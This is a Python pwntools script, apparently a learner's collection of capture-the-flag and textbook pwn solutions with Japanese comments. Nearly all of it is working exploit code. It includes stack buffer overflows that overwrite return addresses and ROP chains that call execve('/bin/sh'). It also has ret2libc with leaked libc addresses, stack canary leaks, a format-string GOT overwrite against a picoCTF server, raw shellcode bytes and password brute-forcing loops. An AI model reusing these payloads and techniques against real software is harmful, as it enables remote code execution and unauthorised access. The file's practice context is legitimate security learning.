import os, sys
import argparse
import logging

from pwn import *

def main( args ):
    
    if args.ope is None:
        
        proc = prologue( args.prog )
        
        check_sof( proc )
    
    elif args.ope == "overwrite_ret_adrs":
        
        proc = prologue( args.prog, b'daisuke' )
        
        val = input()
        print( val )
        
        adrs = b'\x41\x41\x41\x41'
        overwrite_ret_adrs( proc, 408, adrs, dmy=b'\x00' )
    
    elif args.ope == "exec_syscall":
        
        proc = prologue( args.prog, b'daisuke' )
        
        val = input()
        print( val )
        
        ropchain = b''
        
        ropchain += p64( 0x4016ea ) # pop rax; ret;
        ropchain += p64( 0x000027 ) # 0x27(39) getpid()
        ropchain += p64( 0x456889 ) # syscall; ret;
        ropchain += p64( 0x41414141 )
        overwrite_ret_adrs( proc, 408, ropchain, dmy=b'\x00' )
    
    elif args.ope == "shell":
        
        proc = prologue( args.prog, b'daisuke' )
        
        val = input()
        print( val )
        
        shell( proc )
    
    elif args.ope == "remote_shell":
        
        proc = prologue_remote( '127.0.0.1', 15285, ss=b'daisuke' )
        
        val = input()
        print( val )
        
        shell( proc )
    
    elif args.ope == "bruteforce":
        
        # $ python ../../../../python/pwnable.py --ope bruteforce
        
        while True:
            proc = prologue_remote( '127.0.0.1', 4000 )
            
            adrs = b''
            adrs += p32( 0xF7C4C8C0 ) # system関数
            adrs += p32( 0x42424242 ) # BBBB
            adrs += p32( 0xF7DB5FAA ) # "/bin/sh"
            overwrite_ret_adrs( proc, 51, adrs, to=0.1 )
            
            proc.sendline( b'id\nexit' ) # idコマンド
            result = proc.recv( timeout=0.1 )
            if len(result) > 0:
                print( result )
                break
    
    elif args.ope == "adrs_leak":
        
        # セキュリティコンテストチャレンジブック
        # $ cd ~/svn/experiment/securitycontest_challengebook/book4b_pwn/step5/aslr
        # $ socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./bof4
        # $ python ../../../../python/pwnable.py --ope adrs_leak
        
        proc = prologue_remote( '127.0.0.1', 4000 )
        
        ropchain = b''
        ropchain += p32( 0x08048370 ) # write@plt
        ropchain += p32( 0x0804854d ) # pop3ret
        ropchain += p32( 1 )          # write関数の第1引数
        ropchain += p32( 0x0804a018 ) # write関数の第2引数 (__libc_start_main@got)
        ropchain += p32( 4 )          # write関数の第3引数
        
        ropchain += p32( 0x08048330 ) # read@plt
        ropchain += p32( 0x0804854d ) # pop3ret
        ropchain += p32( 0 )          # read関数の第1引数
        ropchain += p32( 0x0804a018 ) # read関数の第2引数 (__libc_start_main@got)
        ropchain += p32( 20 )         # read関数の第3引数
        
        ropchain += p32( 0x08048360 ) # __libc_start_main@plt
        ropchain += p32( 0x42424242 ) # BBBB
        ropchain += p32( 0x0804a018 + 4 ) # __libc_start_main@plt+4 ("/bin/sh")
        
        ret = overwrite_ret_adrs( proc, 51, ropchain )
        
        print( f"ret={ret}, len(ret)={len(ret)}" )
        
        libc_base   = u32(ret) - 0x00023310       # __libc_start_main関数の絶対アドレス - __libc_start_main関数の相対アドレス = libcの先頭アドレス
        libc_system = p32(libc_base + 0x0004c8c0) # libcの先頭アドレス + system関数の相対アドレス = system関数の絶対アドレス
        
        proc.send( libc_system + b'/bin/sh\0' )
        
        proc.interactive()
    
    elif args.ope == "shellcode":
        
        # (GitHubにアップ済み)
        # $ socat tcp-listen:9999,reuseaddr,fork, EXEC:"./shellcode"
        
        # 0x00 が含まれているのに、なぜうまくいったのか？ → scanf関数で"[^\n]"としていたため
        # $ python pwnable.py --ope shellcode --debug
        
        adrs, port = '127.0.0.1', 9999
        #adrs, port = "nc.ctf.setodanote.net", 26503
        
        # サーバに接続
        proc = remote( adrs, port )
        
        while True:
            ret = proc.recvline()
            ret = ret.decode( 'utf-8' )
            if '[' in ret:
                break
        
        adrs = ret[ ret.find('[')+1:ret.find(']') ]
        logging.debug( f"adrs={adrs}" )
        
        ret = proc.recv( timeout=1 )
        
        adrs = int( adrs, base=16 )
        
        buf = b'\xB8\x3B\x00\x00\x00\xEB\x0D\x5F\xBE\x00\x00\x00\x00\xBA\x00\x00\x00\x00\x0F\x05\xE8\xEE\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00'
        buf += b'A' * (88 - len(buf))
        buf += p64( adrs )
        
        proc.sendline( buf )
        
        proc.interactive()
    
    elif args.ope == "PW-Crack-5":
        
        # (GitHubにアップ済み)
        # python pwnable.py --ope PW-Crack-5 --prog level5.py --fpath dictionary.txt --debug
        
        with open(args.fpath) as ff:
            for line in ff:
                print( f"line={line}" )
                proc, ret = prologue_python( args.prog, line.encode('utf-8') )
                if "Welcome" in ret.decode('utf-8'):
                    break
                else:
                    proc.close()
        
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
    
    elif args.ope == "format-string-3":
        
        # (GitHubにアップ済み)
        # $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./format-string-3"
        # $ python pwnable.py --ope format-string-3 --debug
        
        context.bits = 64
        
        #adrs = '127.0.0.1'
        adrs = 'rhea.picoctf.net'
        #port = 4000
        port = 65028
        setbuf_raddr = 0x7a3f0
        system_raddr = 0x4f760
        
        proc = remote( adrs, port )
        
        logging.debug( proc.recvline() ) # Howdy gamers!
        ret = proc.recvline()            # Okay I'll be nice. Here's the address of setvbuf in libc:
        logging.debug( ret )
        
        ret = ret.decode( 'utf-8' )
        
        assert "setvbuf" in ret, f"ret={ret}"
        
        idx = ret.index("libc")
        setbuf_aaddr = int( ret[idx + 6:], base=16 )
        logging.debug( f"setbuf_aaddr={setbuf_aaddr}" )
        
        libc_base    = setbuf_aaddr - setbuf_raddr
        system_aaddr = libc_base + system_raddr
        
        payload = fmtstr_payload( offset=38, writes={0x404018: system_aaddr}, numbwritten=0, write_size="short" )
        
        proc.send( payload )
        
        proc.interactive()
    
    elif args.ope == "PW-Crack-4":
        
        # (GitHubにアップ済み)
        # python pwnable.py --ope PW-Crack-4 --prog level4.py --debug
        
        pos_pw_list = ["158f", "1655", "d21e", "4966", "ed69", "1010", "dded", "844c", "40ab", "a948", "156c", "ab7f", "4a5f", "e38c", "ba12", "f7fd", "d780", "4f4d", "5ba1", "96c5", "55b9", "8a67", "d32b", "aa7a", "514b", "e4e1", "1230", "cd19", "d6dd", "b01f", "fd2f", "7587", "86c2", "d7b8", "55a2", "b77c", "7ffe", "4420", "e0ee", "d8fb", "d748", "b0fe", "2a37", "a638", "52db", "51b7", "5526", "40ed", "5356", "6ad4", "2ddd", "177d", "84ae", "cf88", "97a3", "17ad", "7124", "eff2", "e373", "c974", "7689", "b8b2", "e899", "d042", "47d9", "cca9", "ab2a", "de77", "4654", "9ecb", "ab6e", "bb8e", "b76b", "d661", "63f8", "7095", "567e", "b837", "2b80", "ad4f", "c514", "ffa4", "fc37", "7254", "b48b", "d38b", "a02b", "ec6c", "eacc", "8b70", "b03e", "1b36", "81ff", "77e4", "dbe6", "59d9", "fd6a", "5653", "8b95", "d0e5"]
        
        for line in pos_pw_list :
            print( f"line={line}" )
            proc, ret = prologue_python( args.prog, line.encode('utf-8') )
            if "Welcome" in ret.decode('utf-8'):
                break
            else:
                proc.close()
        
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
        logging.debug( proc.recvline() )
    
    elif args.ope == "sbof_ret":
        
        # gdb-peda で事前準備
        # gdb-peda$ pattc 50
        # 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
        # gdb-peda$ patto (AADAA;A
        # (AADAA;A found at offset: 24
        
        # $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./sbof_ret"
        # $ python pwnable.py --ope sbof_ret --debug
        
        # r15 に与えるアドレスが見つからなかったのでうまく動作しない
        
        adrs = 'localhost'
        port = 4000
        elf  = ELF( "../shokai_security_contest/files/pwnable/03_stack/sbof_ret" )
        
        # サーバに接続
        proc = remote( adrs, port )
        
        logging.debug( proc.recvline(timeout=1) ) # Input Name >> 
        
        ropchain = b''
        
        ropchain += p64( 0x40127a )           # to pop rbx...
        ropchain += p64( 0 )                  # rbx
        ropchain += p64( 1 )                  # rbp
        ropchain += p64( 0xcafebabe )         # r12d -> edi
        ropchain += p64( 0x0123456789ABCDEF ) # r13 -> RSI
        ropchain += p64( 0xFEDCBA9876543210 ) # r14 -> RDX
        ropchain += p64( elf.got['puts'] )    # r15 for call
        ropchain += p64( 0x401260 )           # to pop rbx
        overwrite_ret_adrs( proc, 24, ropchain, dmy=b'\x00' )
        
    
    elif args.ope == "sbof_pivot":
        
        # $ python pwnable.py --ope sbof_pivot
        
        context( os='linux', arch='amd64' )
        
        adrs = 'localhost'
        port = 4000
        #prog = "../shokai_security_contest/files/pwnable/03_stack/sbof_pivot"
        prog = "./sbof_pivot"
        elf  = ELF( prog )
        
        if False:
            # サーバに接続
            #proc = remote( adrs, port )
            proc = prologue_one( prog )
            
            logging.debug( "recv 1: " + proc.recv(timeout=2) ) # Input Name >> 
        else:
            proc = process( ['sh', '-c', prog] )
            #proc = process( prog )
        
        ropchain = b''
        
        ropchain += p64( 0x404060 + 192 - 8 )     # Saved RBP 
        ropchain += p64( 0x4011e4 )               # leave; ret;
        
        if False:
            overwrite_ret_adrs( proc, 16, ropchain[:-1], dmy=b'\x00' )
            logging.debug( proc.recv(timeout=2) ) # Input Message >>
        else:
            logging.debug( proc.recvline() )
            logging.debug( proc.recv(timeout=1) )
            logging.debug( proc.sendline(b'A' * 16 + ropchain[:-1]) )
        
        ropchain = b''
        
        ropchain += p64( 0x4012a3 )           # pop rdi; ret;
        ropchain += p64( 0xcafebabe )         # 
        ropchain += p64( 0x4012a1 )           # pop rsi; pop r15; ret;
        ropchain += p64( 0xc0bebeef )         # 
        ropchain += p64( 0xdeadbeef )         # 何でもいい
        ropchain += p64( 0x4011e6 )           # win()
        
        if False:
            overwrite_ret_adrs( proc, 192, ropchain, dmy=b'\x00' )
        else:
            logging.debug( proc.sendafter('>> ', b'A' * 192 + ropchain, 3) )
    
    elif args.ope == "stack_32_5":
        
        # $ python pwnable.py --ope stack_32_5
        
        context( os='linux', arch='amd64' )
        
        prog = "../shokai_security_contest/files/pwnable/99_challs/stack/chall_stack"
        #prog = "./chall_stack"
        
        elf  = ELF( prog )
        poprax  = 0x59a27
        poprdi  = 0x9c3a
        poprsi  = 0x177ce
        poprdx  = 0x9b3f
        syscall = 0x262a4
        
        proc = process( prog )
        #proc = gdb.debug( prog )
        
        # canaryのリーク
        proc.sendafter( '>> ', b'a' * 0x18 + b'!' )
        proc.recvuntil( 'a!' )
        canary = u64( b'\x00' + proc.recv(7) )
        info( f"canary = 0x{canary:08X}" )
        
        # プログラムバイナリのベースアドレスを求める
        # (Saved RBP に格納されている __libc_csu_init から求める)
        proc.sendafter( '>> ', b'a' * 0x1F + b'!' )
        proc.recvuntil( 'a!' )
        adrs = u64( proc.recv(6) + b'\x00\x00' )
        base = adrs - 0xb180
        info( f"adrs = 0x{adrs:08X}, base=0x{base:08X}" )
        
        # スタックアドレスのリーク
        proc.sendafter( '>> ', b'a' * 0x3F + b'!' )
        proc.recvuntil( 'a!' )
        adrs = u64( proc.recv(6) + b'\x00\x00' )
        stack = adrs - 0x148
        info( f"adrs = 0x{adrs:08X}, stack=0x{stack:08X}" )
        
        ropchain  = b'a' * 0x10
        ropchain += p64( 0x68732f6e69622f ) # "/bin/sh"
        ropchain += p64( canary )
        ropchain += p64( 0xdeadbeef )
        ropchain += p64( base + poprax ) 
        ropchain += p64( 0x3b )          # execve
        ropchain += p64( base + poprdi ) 
        ropchain += p64( stack )         # "/bin/sh"の格納先
        ropchain += p64( base + poprsi ) 
        ropchain += p64( 0x00 )          # execveの第2引数
        ropchain += p64( base + poprdx ) 
        ropchain += p64( 0x00 )          # execveの第3引数
        ropchain += p64( base + syscall ) 
        
        # シェルを取る
        proc.sendafter( '>> ', ropchain )
        
        proc.interactive()
    
    else:
        raise

def prologue( prog, ss ):
    
    # baby_stack起動
    proc = process( ['sh', '-c', prog] )
    
    # "Please tell me your name >> "
    logging.debug( proc.recv(timeout=1) )
    
    logging.debug( ss )
    proc.sendline( ss )
    
    # "Give me your message >> "
    logging.debug( proc.recv(timeout=1) )
    
    return proc

def prologue_one( prog ):
    
    # program起動
    proc = process( ['sh', '-c', prog] )
    
    # "Hello!"
    logging.debug( "recv 0: " + proc.recvline() )
    
    return proc

def prologue_python( prog, ss ):
    
    # level5.py起動
    proc = process( ['python', prog] )
    
    # "Please enter correct password for flag: "
    logging.debug( proc.recv(timeout=1) )
    
    logging.debug( ss )
    proc.sendline( ss )
    
    # "That password is incorrect"
    ret = proc.recvline()
    logging.debug( ret )
    
    return proc, ret

def prologue_remote( adrs, port, to=1, ss=b'' ):
    
    # サーバに接続
    proc = remote( adrs, port )
    
    # 1st message
    logging.debug( proc.recv(timeout=to) )
    
    if ss != b'':
        logging.debug( ss )
        proc.sendline( ss )
        
        # 2nd message
        logging.debug( proc.recv(timeout=to) )
    
    return proc

def check_sof( proc ):
    
    ss = b'A' * 200
    logging.debug( ss )
    proc.sendline( ss )
    
    # receive error
    logging.debug( proc.recv(timeout=1) )

def overwrite_ret_adrs( proc, cnt, adrs, to=1, dmy=b'\x41' ):
    
    ss = dmy * cnt + adrs
    logging.debug( "send: " + ss.hex() )
    proc.sendline( ss )
    
    # receive error
    ret = proc.recv( timeout=to )
    logging.debug( "recv: " + ret.hex() )
    
    return ret

def shell( proc ):
    
    ropchain = b''
    
    adrs_bss = 0x0059f920
    
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( adrs_bss ) # RAX に BSS の開始アドレスを設定 (次の [rax+0x39] が変な場所に書かないようにするため)
    ropchain += p64( 0x470931 ) # pop rdi; or byte [rax+0x39], cl; ret;
    ropchain += p64( adrs_bss ) # RDI(第1引数) に BSS の開始アドレスを設定
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += b'/bin/sh\x00'  # RAX に b'/bin/sh\x00'を設定
    ropchain += p64( 0x456499 ) # mov qword [rdi], rax; ret;
                                # BSS の開始アドレスに b'/bin/sh\x00'を書き込む
    
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( adrs_bss ) # RAX に BSS の開始アドレスを設定 (次の [rax-0x77] が変な場所に書かないようにするため)
    ropchain += p64( 0x46defd ) # pop rsi; ret;
    ropchain += p64( 0 )        # RSI(第2引数) に 0 を設定
    ropchain += p64( 0x4a247c ) # pop rdx; or byte [rax-0x77], cl; ret;
    ropchain += p64( 0 )        # RDX(第3引数) に 0 を設定
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( 0x3b )     # RAX(システムコール番号) に 0x3b を設定
    ropchain += p64( 0x456889 ) # syscall; ret;
    overwrite_ret_adrs( proc, 408, ropchain, dmy=b'\x00' )
    proc.interactive()

def parse_args():
    
    parser = argparse.ArgumentParser( description='baby_stack' )
    
    parser.add_argument( '--ope',   default=None,           help='select operation, [None or ...]' )
    parser.add_argument( '--prog',  default=0,              help='input program path' )
    parser.add_argument( '--fpath', default=None,           help='input file path' )
    parser.add_argument( '--debug', action='store_true',    help='debug' )
    
    return parser.parse_args()

if __name__ == '__main__':
    
    args = parse_args()
    print( f"args={args}" )
    
    if args.debug:
        logname = os.path.basename( sys.argv[0] )
        logname = os.path.splitext(logname)[0] + ".log"
        if os.path.isfile( logname ):
            os.remove( logname )
        logging.basicConfig( level=logging.DEBUG, handlers=[logging.FileHandler(logname), logging.StreamHandler(sys.stdout)] )
    else:
        logging.basicConfig( level=logging.INFO )
    
    main( args )
